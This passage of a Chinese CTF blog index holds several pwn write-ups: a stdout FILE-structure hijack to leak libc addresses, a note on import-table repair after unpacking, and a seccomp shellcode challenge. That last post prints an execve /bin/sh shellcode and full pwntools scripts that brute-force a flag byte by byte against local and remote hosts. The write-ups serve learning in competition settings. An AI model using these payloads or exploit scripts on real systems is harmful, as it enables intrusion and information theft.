f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>
<p>而</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (ch == EOF)</span><br><span class="line">    return _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">                         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
<p>有可能被我们控制。</p>
<p>只需要满足：<code>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0</code>就会进行这个判断,也就是<code>_IO_CURRENTLY_PUTTING为1</code>(stdout中本来就是1)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br></pre></td></tr></table></figure>
<p>考虑到<code>_IO_new_file_xsputn</code>中这条语句的影响，我们可以直接修改_IO_write_base的值</p>
<p>再看<code>_IO_do_write</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">          || (<span class="keyword">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">off64_t</span> new_pos</span><br><span class="line">        = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">                       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">                       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了正常运行这个函数，不让他return 0.需要满足<code>_IO_IS_APPENDING=1</code></p>
<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>泄露的实例如下，当我们可以控制stdout时，只需如下操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new(0x60,p64(0xfbad1800) + p64(0)*3 + &quot;\x00&quot;)</span><br><span class="line">leak = r.recv(0x20)</span><br><span class="line">leak = leak[0x18:]</span><br><span class="line">leak_Addr = u64(leak[:6].ljust(8,&quot;\x00&quot;))-e.symbols[&quot;_IO_file_jumps&quot;]</span><br><span class="line">print hex(leak_Addr)</span><br></pre></td></tr></table></figure>
<p>另一个重点则在于如何劫持stdout结构体</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/04/输入表的替换/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/04/输入表的替换/" itemprop="url">输入表的替换</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-04T20:53:01+08:00">
                2019-08-04
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  118
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>遇到一个题目，正常的手动脱壳完成之后运行程序失败，出现这样的东西</p>
<p> <img src="/2019/08/04/输入表的替换/错误1.PNG" alt="错误1"></p>
<p>解决的方法是使用工具ImportREConstructor 1.7e</p>
<p>在IREC树形框里找到user32.dll 展开找到NtdllDefWindowProc_A</p>
<p>在弹出窗口的module中找到user32.dll 然后在下面的列表框中找到DefWindowProcA</p>
<p>在弹出窗口的module中找到user32.dll 然后在下面的列表框中找到DefWindowProcA<br>再修复就不会有这样的情况了</p>
<p> <img src="/2019/08/04/输入表的替换/修正1.PNG" alt="修正1"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/22/seccomp-flag-s爆破/" itemprop="url">seccompmp_flag' ![buf](seccomp-flag-s爆破\buf.PNG)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T13:58:48+08:00">
                2019-07-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  861
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  3
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>刚做完了一道题目，是一道shellcode题目，当然，有一定的保护 <img src="/2019/07/22/seccomp-flag-s爆破/buf.PNG" alt="buf"></p>
<p> <img src="/2019/07/22/seccomp-flag-s爆破/protect.PNG" alt="protect"></p>
<p>从以上两张照片可以看到这个题目中给的shellcode的限制</p>
<p>不能出现空字符</p>
<p>关闭了输入流，输出流，以及error</p>
<p>只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</p>
<h4 id="任意输入数据，gdb调试一波"><a href="#任意输入数据，gdb调试一波" class="headerlink" title="任意输入数据，gdb调试一波"></a>任意输入数据，gdb调试一波</h4><p>加上，开始调试</p>
<p> <img src="/2019/07/22/seccomp-flag-s爆破/bendiflag.PNG" alt="bendiflag"></p>
<p>发现有有用的其实也就上面的图，读取/flag文件之后把内容读取到了rdi，rdx寄存器中。so，我们的shellcode 好写一点了。</p>
<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>长度&lt;=200</p>
<p>我最常用的无任何限制的shellcode的长度是0x18</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</span><br></pre></td></tr></table></figure>
<p>即使是随便其他的shellcode，也比200小得多，所以这个限制没什么</p>
<h4 id="关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"><a href="#关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）" class="headerlink" title="关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"></a>关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</h4><p>md，本来我是不知道close(0),close(1),close(2).所以我想的是既然开了write，还有rdi,rdx寄存器里存着，直接write读取不就完了。只要想着绕开空字符限制就好了。然而失败了。卡了好大阵子后。。终于发现read，close还是不能用。。。。我哭了</p>
<h4 id="无空字符限制"><a href="#无空字符限制" class="headerlink" title="无空字符限制"></a>无空字符限制</h4><p>本来解决这个限制的原因是使用write系统调用，虽然write调用没用，但是解决方法倒是找到了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3c999999</span><br><span class="line">shr rax,24</span><br></pre></td></tr></table></figure>
<p>使用这种方法，很轻松的就可以讲想要的寄存器放入任意的数值，而且，不需要担心空字节问题，我tql</p>
<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>最终，找到了方法，爆破，我只需要编写类似的语句就可以了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if flag[i] == flag_byte:</span><br><span class="line">	i++</span><br><span class="line">else:</span><br><span class="line">	flag_byte++</span><br></pre></td></tr></table></figure>
<p>emmm</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov sil,byte ptr[rdx+&apos;&apos;&apos;+str(i)+&apos;&apos;&apos;]</span><br><span class="line">mov dil,&apos;&apos;&apos;+hex(flag_byte)+&apos;&apos;&apos;</span><br><span class="line">cmp sil,dil</span><br><span class="line">je right</span><br><span class="line">mov rax,0x11999999</span><br><span class="line">syscall</span><br><span class="line">right:</span><br><span class="line">mov rax,0x3c999999</span><br><span class="line">shr rax,24</span><br><span class="line">xor rdi,rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">xor rsi,rsi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>只需要让他在失败的时候调用无法无法运行的语句，成功的时候正常退出就好了。完美</p>
<h4 id="然而"><a href="#然而" class="headerlink" title="然而"></a>然而</h4><p>本地跑和远程居然不一样！</p>
<p>我本地得到的反馈是，如果正常退出</p>
<p>会有exit 0这样子的输出</p>
<p>我就用pwntools里的p.poll来判断</p>
<p>但是远程不行。。幸亏有反馈</p>
<p>so，本地脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> flag_byte <span class="keyword">in</span> xrange(<span class="number">105</span>,<span class="number">107</span>): </span><br><span class="line">	p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">	<span class="comment">#p = remote('pwn1.blue-whale.me',19910)</span></span><br><span class="line">	p.recvuntil(<span class="string">'vehicle\n'</span>)</span><br><span class="line">	<span class="comment">#the flag was stored in rdx and rdi</span></span><br><span class="line">	shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov sil,byte ptr[rdx+'''</span>+str(i)+<span class="string">''']</span></span><br><span class="line"><span class="string">	mov dil,'''</span>+hex(flag_byte)+<span class="string">'''</span></span><br><span class="line"><span class="string">	cmp sil,dil</span></span><br><span class="line"><span class="string">	je right</span></span><br><span class="line"><span class="string">	mov rax,0x11999999</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	right:</span></span><br><span class="line"><span class="string">	mov rax,0x3c999999</span></span><br><span class="line"><span class="string">	shr rax,24</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	)</span><br><span class="line">	p.sendline(shellcode)</span><br><span class="line">	<span class="keyword">if</span> p.poll()!=<span class="number">0</span>:</span><br><span class="line">	    p.close()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">	    flag += chr(flag_byte)</span><br><span class="line">	    log.success(flag)</span><br></pre></td></tr></table></figure>
<p>远程脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#flag = "ctf&#123;1eak1ng_0n1y_One_biT_is_impor7anT_To_The_security_of_2"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> flag_byte <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>): </span><br><span class="line">	<span class="comment">#p = process('./pwn')</span></span><br><span class="line">	p = remote(<span class="string">'pwn2.blue-whale.me'</span>,<span class="number">19910</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'vehicle\n'</span>)</span><br><span class="line">	<span class="comment">#the flag was stored in rdx and rdi</span></span><br><span class="line">	shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov sil,byte ptr[rdx+'''</span>+str(i)+<span class="string">''']</span></span><br><span class="line"><span class="string">	mov dil,'''</span>+hex(flag_byte)+<span class="string">'''</span></span><br><span class="line"><span class="string">	cmp sil,dil</span></span><br><span class="line"><span class="string">	je right</span></span><br><span class="line"><span class="string">	mov rax,0x11999999</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	right:</span></span><br><span class="line"><span class="string">	mov rax,0x3c999999</span></span><br><span class="line"><span class="string">	shr rax,24</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	xor rsi,rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	)</span><br><span class="line">	p.sendline(shellcode)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p.recv(timeout =<span class="number">0.5</span>)</span><br><span class="line">		p.close()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		flag += chr(flag_byte)</span><br><span class="line">	    	log.success(flag)</span><br></pre></td></tr></table></figure>
<h4 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h4><p>在题目复现的时候会发现，seccomp的使用，使得直接进行gdb调试是可行的，但是使用pwntools进行attach调试会失败。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/photo/hello.jpg"
                alt="John Doe" />
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">40</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://oj.blue-whale.me" target="_blank" title="Blue_Whaleoj">
                      
                        <i class="fa fa-fw fa-globe"></i>Blue_Whaleoj</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://bleachz.github.io/" target="_blank" title="DALAO">
                      
                        <i class="fa fa-fw fa-globe"></i>DALAO</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">27.5k</span>
  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  




  

  
</body>
</html>
